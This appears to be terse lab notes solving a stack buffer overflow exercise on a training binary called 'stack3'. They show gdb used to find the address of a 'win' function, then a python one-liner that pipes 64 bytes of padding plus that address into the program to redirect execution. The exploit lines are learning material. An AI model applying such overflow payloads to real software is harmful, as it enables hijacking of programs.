gdb ./stack3
(gdb) break 12
(gdb) print win # 0x8048424

python -c "print('a' * 64 + '24840408'.decode('hex'))" | ./stack3